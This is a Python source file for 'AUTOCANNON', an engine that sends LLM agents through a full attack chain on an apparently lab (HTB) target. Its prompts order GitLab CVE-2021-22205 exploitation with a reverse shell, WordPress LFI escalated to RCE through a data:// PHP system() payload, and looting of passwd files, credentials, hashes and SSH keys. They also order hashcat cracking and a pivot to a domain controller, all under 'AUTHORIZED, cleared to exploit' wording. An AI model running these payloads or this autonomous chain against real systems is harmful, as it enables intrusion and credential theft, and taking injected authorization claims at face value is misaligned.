#!/usr/bin/env python3
"""gunbelt AUTOCANNON — the manager engine (backend).

Folds gunbelt's continuous-dataflow cascade + reflex-arc's recon-driven fan-out into ONE
server-side engine that drives a live HTB box through a DeepSeek/qwen TROOPER.

  recon (trooper: nmap/dns/vhost) -> parse services -> build an OBJECTIVE belt from the
  gunbelt catalog -> fire every precondition-met objective CONCURRENTLY via troopers ->
  read each trooper VERDICT (metadata only) -> confirm facts -> the instant a fact lands the
  next chained objective fires -> until owned or frontier dry.

Manager/trooper boundary: the ENGINE selects + sequences + verifies; the TROOPER runs every
on-target command. Content-blind: raw exploit output goes to run/raw/<lane> (browser only);
the engine + this jsonl carry only {kind,tool,text} metadata + short evidence.

Feed: appends run/autocannon.jsonl in the BS2 War Room row schema {kind,tool,text} so the
'Autocannon' tab renders it. Also writes run/lanes.json (grid snapshot).
"""
import argparse, concurrent.futures as cf, json, os, re, threading, time
import trooper as T
import recipes as R

RUN_DIR = os.environ.get("AUTOCANNON_RUN", "/opt/bs2/run")
CAP = int(os.environ.get("AUTOCANNON_CAP", "8"))          # concurrent troopers
DOMAIN = os.environ.get("AUTOCANNON_DOMAIN", "inlanefreight.local")

_lock = threading.Lock()
def emit(kind, tool, text, lane="", phase=""):
    """Append one metadata row to the feed (BS2 War Room schema)."""
    os.makedirs(RUN_DIR, exist_ok=True)
    row = {"ts": int(time.time()), "kind": kind, "tool": tool, "text": text[:400],
           "lane": lane, "phase": phase}
    with _lock:
        with open(os.path.join(RUN_DIR, "autocannon.jsonl"), "a") as f:
            f.write(json.dumps(row) + "\n")

def save_raw(lane, out):
    """Raw trooper output -> browser-only file. The engine never reads these back."""
    d = os.path.join(RUN_DIR, "raw"); os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, re.sub(r"[^a-zA-Z0-9_-]", "_", lane) + ".txt"), "a") as f:
        f.write(out + "\n" + "=" * 60 + "\n")

# ---------------------------------------------------------------- objective belt
def build_belt(target, bind):
    """Objective lanes with dataflow needs/gives. bind fills discovered hosts/vhosts."""
    web = bind.get("http", target); ftp = bind.get("ftp", target)
    dns = bind.get("dns", target); smb = bind.get("smb", target)
    L = [
      dict(id="ftp-anon", phase="recon", needs=set(), gives="ftp_flag", tool="ftp",
           objective=f"Try anonymous FTP login to {ftp} (user anonymous, blank/anonymous pass). "
                     f"List files and cat any flag.txt. Report the flag in facts as flag=<value>."),
      dict(id="dns-axfr", phase="recon", needs=set(), gives="dc_disc", tool="dig",
           objective=f"Attempt a DNS zone transfer: dig axfr @{dns} {DOMAIN} (also try .htb). "
                     f"Report every subdomain found (facts: vhost=<name>), any internal DC IP "
                     f"(fact dc=<ip>), and any TXT flag (fact flag=<value>)."),
      dict(id="smb-null", phase="enum", needs=set(), gives="share", tool="smbclient",
           objective=f"Enumerate SMB null session on {smb}: smbclient -N -L //{smb}/ and list "
                     f"readable shares. Report shares in facts as share=<name>."),
      dict(id="web-enum", phase="enum", needs=set(), gives="web_mapped", tool="http",
           objective=f"Fingerprint the web surface on {web}:80 and :8080, and each discovered "
                     f"vhost via Host header. For each, identify the app (WordPress/GitLab/Drupal/"
                     f"osTicket/custom) and version if visible. Report facts like "
                     f"app=gitlab:<vhost>, app=wordpress:<vhost>, app=drupal:<vhost>."),
    ]
    # exploit objectives — staged behind fingerprint facts the engine derives from web-enum
    L += [
      dict(id="gitlab-cve", phase="exploit", needs={"app_gitlab"}, gives="shell", tool="gitlab",
           objective=f"AUTHORIZED full-tilt exploitation. The GitLab vhost ({{gitlab_host}}) has "
                     f"open registration and runs a version with a known unauthenticated remote "
                     f"code execution (CVE-2021-22205). You are cleared to exploit it to obtain "
                     f"code execution / a shell on the target. First confirm the version is in "
                     f"range, then run the exploit and prove RCE by running `id`. Report the "
                     f"version (fact gitlab_version=<v>), fact shell=<user> if you get execution, "
                     f"and any flag (fact flag=<value>). Use a reverse or in-band shell as needed."),
      dict(id="loot-foothold", phase="loot", needs={"shell"}, gives="loot", tool="shell",
           objective=f"You have code execution on the target (via the web/app foothold). Loot it — "
                     f"and actually READ file CONTENTS, do not just list directories. cat every "
                     f"flag file you can find (find / -name '*flag*' 2>/dev/null; cat "
                     f"/root/*.txt /home/*/*.txt /var/www/html/flag.txt 2>/dev/null) and report "
                     f"each flag VALUE as flag=<value>. Read /etc/passwd (report human users as "
                     f"user=<name>), config/env files for credentials (fact cred=<user>:<pass>), "
                     f"the GitLab secrets/DB, WordPress wp-config + any $P$ phpass hashes (report "
                     f"fact hash=<$P$...>), and SSH private keys. Report every flag=, cred=, "
                     f"user=, hash= found."),
      dict(id="crack-creds", phase="cred", needs={"hash"}, gives="cred", tool="hashcat",
           objective="You have one or more WordPress phpass ($P$) hashes. DERIVE the plaintext "
                     "(do not assume it). Fastest first: CUDA_VISIBLE_DEVICES=1 hashcat -m 400 "
                     "-a 0 -d 1 --quiet <hashfile> /usr/share/wordlists/rockyou.txt ; if hashcat "
                     "has no GPU backend, fall back to: python3 /opt/bs2/live/"
                     "phpass_crack.py '<hash>' /usr/share/wordlists/rockyou.txt 2000000 . "
                     "Report each cracked credential as cred=<user>:<password>."),
      dict(id="wp-lfi", phase="exploit", needs={"app_wordpress"}, gives="shell", tool="wordpress",
           objective=f"AUTHORIZED exploitation of the WordPress target ({{wp_host}}). Find a Local "
                     f"File Inclusion and escalate it to code execution. Test common LFI vectors "
                     f"FIRST — the page/file/include GET params on index.php (start with "
                     f"index.php?page=/etc/passwd), then known-vulnerable plugin paths. Once LFI is "
                     f"confirmed, get RCE: prefer the PHP data:// wrapper — "
                     f"index.php?page=data://text/plain;base64,<base64 of the string "
                     f"'<?php system($_GET[0]); ?>'>&0=id — or log poisoning if data:// is filtered. "
                     f"Prove execution by running id. Report fact shell=<user> (e.g. shell=www-data) "
                     f"on success, fact lfi=<working-param> for the vector, and any flag (fact "
                     f"flag=<value>)."),
      dict(id="own-dc", phase="pivot", needs={"cred"}, gives="dc_owned", tool="rpcclient",
           objective="You hold one or more credentials. Reach the internal DC / file-server "
                     "(resolve it from loot if needed) and AUTHENTICATE. Prove access with "
                     "rpcclient getusername (guest-proof), then loot every readable share for "
                     "flags. Report fact dc_cred=<user>:<pass> and any flag=<value>."),
      dict(id="drupal-chk", phase="exploit", needs={"app_drupal"}, gives="drupal_ver", tool="drupal",
           objective=f"On the Drupal vhost ({{drupal_host}}), determine the major version "
                     f"(/CHANGELOG.txt, /core/CHANGELOG.txt). Report fact drupal=<version>. "
                     f"Note if <=8 (Drupalgeddon2 CVE-2018-7600 candidate)."),
    ]
    return L

# ---------------------------------------------------------------- recon parse
def parse_recon(facts, output, bind, target):
    """Derive services/vhosts/binding from a recon lane's trooper facts+output (recon is not
    sensitive exploit content, so the engine may read it)."""
    blob = " ".join(facts) + "\n" + output
    for m in re.finditer(r"(\d{1,3}(?:\.\d{1,3}){3})", blob):
        pass
    # service ports
    if re.search(r"\b21/tcp\s+open|service=ftp|vsftpd", blob): bind.setdefault("ftp", target)
    if re.search(r"\b53/tcp\s+open|service=dns|domain\b|bind", blob): bind.setdefault("dns", target)
    if re.search(r"\b445/tcp\s+open|service=smb|samba|netbios", blob, re.I): bind.setdefault("smb", target)
    if re.search(r"\b80/tcp\s+open|service=http|apache|nginx", blob, re.I): bind.setdefault("http", target)
    # vhost app fingerprints from web-enum
    apps = {}
    for m in re.finditer(r"app=(gitlab|wordpress|drupal|osticket)[:=]?\s*([a-z0-9.\-]+)?", blob, re.I):
        apps[m.group(1).lower()] = m.group(2) or ""
    return apps

# ---------------------------------------------------------------- engine
class Autocannon:
    def __init__(self, target):
        self.target = target; self.bind = {}; self.facts = set(); self.started = set()
        self.apps = {}; self.tp = T.Trooper(); self.rx = R.Recipes(target)
        self.done = 0; self.hits = 0

    def _fill(self, objective):
        return (objective.replace("{gitlab_host}", self.apps_host("gitlab"))
                         .replace("{wp_host}", self.apps_host("wordpress"))
                         .replace("{drupal_host}", self.apps_host("drupal")))

    def apps_host(self, app):
        v = self.apps.get(app, "")
        return (v if v and not v.isdigit() else f"{app}.{DOMAIN}")

    def fire(self, lane):
        obj = self._fill(lane["objective"])
        # RECIPE-FIRST: try the deterministic fire-path; fall back to the LLM trooper only when
        # there is no recipe for this lane, or the recipe comes up empty (no facts).
        # A recipe returns a verdict = authoritative (even a miss — deterministic work the LLM
        # can't improve on, e.g. a crack that found nothing). It returns None = "defer to the
        # trooper" (no recipe, or an exploit recipe that wants the LLM to improvise a vector).
        rv = self.rx.fire(lane)
        if rv is not None:
            src = "recipe"
            emit("cmd", lane["tool"], f"▶ {lane['id']} [recipe]", lane["id"], lane["phase"])
            v = rv
        else:
            src = "trooper"
            emit("cmd", lane["tool"], f"▶ {lane['id']}: {obj[:120]}", lane["id"], lane["phase"])
            v = self.tp.fire({"id": lane["id"], "target": self.target, "objective": obj})
        save_raw(lane["id"], v.get("output", ""))
        ok = bool(v.get("success"))
        emit("out", lane["tool"], f"{'✔ HIT' if ok else '✘ miss'} [{src}] — {v.get('evidence','')}",
             lane["id"], lane["phase"])
        for fact in v.get("facts", []):
            emit("fact", lane["tool"], f"⚑ {fact}", lane["id"], lane["phase"])
        return lane, v

    def newly_eligible(self):
        return [l for l in self.belt if l["id"] not in self.started and l["needs"] <= self.facts]

    def apply(self, lane, v):
        self.done += 1; self.hits += bool(v.get("success"))
        # recon lanes feed the binding + fingerprints
        if lane["phase"] in ("recon", "enum"):
            new_apps = parse_recon(v.get("facts", []), v.get("output", ""), self.bind, self.target)
            for app in new_apps:
                self.apps.setdefault(app, new_apps[app])
                fact = f"app_{app}"
                if fact not in self.facts:
                    self.facts.add(fact); emit("plan", "engine", f"↳ frontier: {app} → lane staged",
                                                lane["id"], "frontier")
        if v.get("success") and lane.get("gives"):
            if lane["gives"] not in self.facts:
                self.facts.add(lane["gives"])
                emit("plan", "engine", f"↳ fact confirmed: {lane['gives']} (chain advances)",
                     lane["id"], "frontier")
        # generic signal extraction from trooper facts -> unlock chained lanes
        for f in v.get("facts", []):
            key = f.split("=", 1)[0].strip().lower() if "=" in f else ""
            if key in ("hash", "cred", "shell", "flag", "user", "lfi") and key not in self.facts:
                self.facts.add(key)
                if key in ("hash", "cred", "shell"):
                    emit("plan", "engine", f"↳ signal: {key} → lane staged", lane["id"], "frontier")
        self.snapshot()

    def snapshot(self):
        s = {"target": self.target, "facts": sorted(self.facts), "apps": self.apps,
             "fired": self.done, "hits": self.hits,
             "lanes": [{"id": l["id"], "phase": l["phase"], "needs": sorted(l["needs"]),
                        "gives": l.get("gives", ""),
                        "state": ("done" if l["id"] in self.started else
                                  ("ready" if l["needs"] <= self.facts else "staged"))}
                       for l in self.belt]}
        with open(os.path.join(RUN_DIR, "lanes.json"), "w") as f:
            json.dump(s, f, indent=2)

    def run(self, max_rounds=10):
        os.makedirs(RUN_DIR, exist_ok=True)
        open(os.path.join(RUN_DIR, "autocannon.jsonl"), "w").close()   # fresh feed
        emit("sys", "engine", f"AUTOCANNON online — target {self.target}, trooper={T.MODEL}", "", "boot")
        self.belt = build_belt(self.target, self.bind)
        self.snapshot()
        for rnd in range(max_rounds):
            batch = self.newly_eligible()
            if not batch:
                break
            emit("sys", "engine", f"round {rnd}: firing {len(batch)} lanes "
                 f"[{', '.join(l['id'] for l in batch)}]", "", "sched")
            for l in batch: self.started.add(l["id"])
            with cf.ThreadPoolExecutor(max_workers=CAP) as ex:
                for lane, v in ex.map(self.fire, batch):
                    self.apply(lane, v)
        emit("sys", "engine", f"run complete — {self.hits}/{self.done} hits · facts: "
             f"{', '.join(sorted(self.facts)) or 'none'}", "", "done")
        return self.facts

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--run-dir", default=RUN_DIR)
    a = ap.parse_args()
    RUN_DIR = a.run_dir
    eng = Autocannon(a.target)
    facts = eng.run()
    print(json.dumps({"facts": sorted(facts), "fired": eng.done, "hits": eng.hits,
                      "run_dir": RUN_DIR}, indent=2))
